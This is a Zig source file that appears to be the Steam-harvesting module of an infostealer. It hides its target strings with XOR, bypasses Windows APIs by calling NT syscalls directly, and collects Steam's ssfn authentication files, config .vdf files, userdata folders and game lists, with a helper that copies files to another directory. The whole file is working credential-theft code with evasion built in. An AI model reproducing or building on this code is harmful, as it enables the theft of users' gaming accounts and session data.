const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const file_io = @import("../parsers/file_io.zig");
const hash = @import("../types/hash.zig");

const FILE_GENERIC_WRITE: types.ULONG = 0x40000000;
const FILE_OVERWRITE_IF: types.ULONG = 0x00000005;
const FILE_SHARE_READ: types.ULONG = 0x00000001;
const FILE_SYNCHRONOUS_IO_NONALERT: types.ULONG = 0x00000020;
const FILE_NON_DIRECTORY_FILE: types.ULONG = 0x00000040;
const HKEY_CURRENT_USER: types.HANDLE = @ptrFromInt(@as(usize, 0x80000001));
const HKEY_LOCAL_MACHINE: types.HANDLE = @ptrFromInt(@as(usize, 0x80000002));

const E = struct {
    pub const reg_path = hash.xorEncrypt("Software\\Valve\\Steam");
    pub const value_name = hash.xorEncrypt("SteamPath");
    pub const fallback_path = hash.xorEncrypt("C:\\Program Files (x86)\\Steam");
    pub const config_dir = hash.xorEncrypt("config");
    pub const userdata_dir = hash.xorEncrypt("userdata");
    pub const steamapps_dir = hash.xorEncrypt("steamapps");
    pub const common_dir = hash.xorEncrypt("common");
};

const SteamAccount = struct {
    steam_id: []const u8,
    account_name: []const u8,
    token: []const u8,
};

pub const SteamResult = struct {
    steam_path: ?[]const u8,
    ssfn_files: [][]const u8,
    vdf_files: [][]const u8,
    userdata_dirs: [][]const u8,
    installed_games: [][]const u8,
    accounts: []SteamAccount,
};

fn readRegistrySteamPath(allocator: std.mem.Allocator) ?[]const u8 {
    var key_handle: types.HANDLE = undefined;
    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, 0),
        .MaximumLength = @as(types.USHORT, 0),
        .Buffer = undefined,
    };

    var reg_decrypted: [E.reg_path.len]u8 = undefined;
    hash.xorDecrypt(&E.reg_path, &reg_decrypted);

    var buf: [1024]u16 = undefined;
    for (reg_decrypted, 0..) |c, i| {
        if (i >= buf.len) return null;
        buf[i] = c;
    }
    name_us.Length = @as(types.USHORT, @intCast(reg_decrypted.len * 2));
    name_us.MaximumLength = @as(types.USHORT, @intCast(buf.len * 2));
    name_us.Buffer = @as(types.PWSTR, @ptrCast(&buf));

    var attr = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = HKEY_CURRENT_USER,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    const status = engine.NtOpenKey(&key_handle, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&attr)));
    if (status < 0) return null;
    defer _ = engine.NtClose(key_handle);

    var value_buf: [4096]u8 = undefined;
    var steam_path_buf: [512]u16 = undefined;

    var val_decrypted: [E.value_name.len]u8 = undefined;
    hash.xorDecrypt(&E.value_name, &val_decrypted);

    for (val_decrypted, 0..) |c, i| {
        steam_path_buf[i] = c;
    }
    var value_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(val_decrypted.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(steam_path_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&steam_path_buf)),
    };

    var result_len: types.ULONG = 0;
    const q_status = engine.NtQueryValueKey(
        key_handle,
        &value_us,
        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @as(types.PVOID, @ptrCast(&value_buf)),
        value_buf.len,
        &result_len,
    );
    if (q_status < 0) return null;

    const info = @as(*types.KEY_VALUE_PARTIAL_INFORMATION, @ptrCast(&value_buf));
    const data_slice = info.Data[0 .. info.DataLength - 2];
    const wide = @as([*]u16, @ptrCast(@alignCast(data_slice.ptr)))[0 .. data_slice.len / 2];
    var utf8_buf: [512]u8 = undefined;
    var utf8_len: usize = 0;
    for (wide) |w| {
        if (w == 0) break;
        if (w < 128) {
            if (utf8_len >= utf8_buf.len) break;
            utf8_buf[utf8_len] = @as(u8, @intCast(w));
            utf8_len += 1;
        }
    }
    return allocator.dupe(u8, utf8_buf[0..utf8_len]);
}

fn copyFileNT(src_path: []const u8, dest_dir: []const u8, allocator: std.mem.Allocator) !void {
    const src_mmap = file_io.MappedFile.open(src_path) orelse return error.CannotOpenSource;
    defer src_mmap.close();
    const data = src_mmap.slice();
    if (data.len == 0) return;

    const basename = std.fs.path.basename(src_path);
    const dest_path = try std.fs.path.join(allocator, &[_][]const u8{ dest_dir, basename });
    defer allocator.free(dest_path);

    var dest_buf: [512]u16 = undefined;
    for (dest_path, 0..) |c, i| {
        if (i >= dest_buf.len) return;
        dest_buf[i] = c;
    }

    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(dest_path.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(dest_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&dest_buf)),
    };

    var attr = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var file_handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;
    const alloc_size: types.LARGE_INTEGER = @intCast(data.len);

    const c_status = engine.NtCreateFile(
        &file_handle,
        FILE_GENERIC_WRITE,
        @as(types.PVOID, @ptrCast(&attr)),
        @as(types.PVOID, @ptrCast(&iosb)),
        @as(*const anyopaque, @ptrCast(&alloc_size)),
        0,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        null,
        0,
    );
    if (c_status < 0) return;
    defer _ = engine.NtClose(file_handle);

    _ = engine.NtWriteFile(
        file_handle,
        @as(types.HANDLE, @ptrFromInt(@as(usize, 0))),
        null,
        null,
        @as(types.PVOID, @ptrCast(&iosb)),
        @as(types.PVOID, @ptrCast(@constCast(data.ptr))),
        @as(types.ULONG, @intCast(data.len)),
        null,
        null,
    );
}

fn collectSsfnFiles(allocator: std.mem.Allocator, steam_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(steam_path, .{}) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .file) {
            const name = entry.name;
            if (name.len >= 4 and std.mem.startsWith(u8, name, "ssfn")) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ steam_path, name });
                try files.append(full);
            }
        }
    }
    return files.toOwnedSlice();
}

fn collectVdfFiles(allocator: std.mem.Allocator, steam_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var config_decrypted: [E.config_dir.len]u8 = undefined;
    hash.xorDecrypt(&E.config_dir, &config_decrypted);

    const config_path = try std.fs.path.join(allocator, &[_][]const u8{ steam_path, &config_decrypted });
    defer allocator.free(config_path);

    var dir = std.fs.openDirAbsolute(config_path, .{}) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .file) {
            const ext = std.fs.path.extension(entry.name);
            if (std.mem.eql(u8, ext, ".vdf")) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ config_path, entry.name });
                try files.append(full);
            }
        }
    }
    return files.toOwnedSlice();
}

fn collectUserdataDirs(allocator: std.mem.Allocator, steam_path: []const u8) ![][]const u8 {
    var dirs = std.ArrayList([]const u8).init(allocator);

    var userdata_decrypted: [E.userdata_dir.len]u8 = undefined;
    hash.xorDecrypt(&E.userdata_dir, &userdata_decrypted);

    const userdata_path = try std.fs.path.join(allocator, &[_][]const u8{ steam_path, &userdata_decrypted });
    defer allocator.free(userdata_path);

    var dir = std.fs.openDirAbsolute(userdata_path, .{}) catch return dirs.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .directory) {
            const full = try std.fs.path.join(allocator, &[_][]const u8{ userdata_path, entry.name });
            try dirs.append(full);
        }
    }
    return dirs.toOwnedSlice();
}

fn listInstalledGames(allocator: std.mem.Allocator, steam_path: []const u8) ![][]const u8 {
    var games = std.ArrayList([]const u8).init(allocator);

    var steamapps_decrypted: [E.steamapps_dir.len]u8 = undefined;
    hash.xorDecrypt(&E.steamapps_dir, &steamapps_decrypted);
    var common_decrypted: [E.common_dir.len]u8 = undefined;
    hash.xorDecrypt(&E.common_dir, &common_decrypted);

    const steamapps_path = try std.fs.path.join(allocator, &[_][]const u8{ steam_path, &steamapps_decrypted, &common_decrypted });
    defer allocator.free(steamapps_path);

    var dir = std.fs.openDirAbsolute(steamapps_path, .{}) catch return games.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .directory) {
            const full = try std.fs.path.join(allocator, &[_][]const u8{ steamapps_path, entry.name });
            try games.append(full);
        }
    }
    return games.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming_app_data: []const u8) !SteamResult {
    _ = local_app_data;
    _ = roaming_app_data;

    var fallback_decrypted: [E.fallback_path.len]u8 = undefined;
    hash.xorDecrypt(&E.fallback_path, &fallback_decrypted);

    const steam_path = readRegistrySteamPath(allocator) orelse blk: {
        const fallback = try std.fs.path.join(allocator, &[_][]const u8{ &fallback_decrypted });
        var dir = std.fs.openDirAbsolute(fallback, .{}) catch break :blk null;
        dir.close();
        break :blk fallback;
    };

    if (steam_path == null) {
        return SteamResult{
            .steam_path = null,
            .ssfn_files = &[_][]const u8{},
            .vdf_files = &[_][]const u8{},
            .userdata_dirs = &[_][]const u8{},
            .installed_games = &[_][]const u8{},
            .accounts = &[_]SteamAccount{},
        };
    }

    errdefer allocator.free(steam_path.?);

    const ssfn_files = try collectSsfnFiles(allocator, steam_path.?);
    const vdf_files = try collectVdfFiles(allocator, steam_path.?);
    const userdata_dirs = try collectUserdataDirs(allocator, steam_path.?);
    const installed_games = try listInstalledGames(allocator, steam_path.?);

    return SteamResult{
        .steam_path = steam_path,
        .ssfn_files = ssfn_files,
        .vdf_files = vdf_files,
        .userdata_dirs = userdata_dirs,
        .installed_games = installed_games,
        .accounts = &[_]SteamAccount{},
    };
}

fn freeSteamResult(result: SteamResult, allocator: std.mem.Allocator) void {
    if (result.steam_path) |p| allocator.free(p);
    for (result.ssfn_files) |f| allocator.free(f);
    allocator.free(result.ssfn_files);
    for (result.vdf_files) |f| allocator.free(f);
    allocator.free(result.vdf_files);
    for (result.userdata_dirs) |d| allocator.free(d);
    allocator.free(result.userdata_dirs);
    for (result.installed_games) |g| allocator.free(g);
    allocator.free(result.installed_games);
    for (result.accounts) |a| {
        allocator.free(a.steam_id);
        allocator.free(a.account_name);
        allocator.free(a.token);
    }
    allocator.free(result.accounts);
}

const testing = std.testing;

test "collect returns empty result for nonexistent steam" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer freeSteamResult(result, testing.allocator);
    try testing.expect(result.steam_path == null);
    try testing.expectEqual(@as(usize, 0), result.ssfn_files.len);
    try testing.expectEqual(@as(usize, 0), result.vdf_files.len);
}

test "readRegistrySteamPath returns null for fake path" {
    const result = readRegistrySteamPath(testing.allocator);
    try testing.expect(result == null);
}
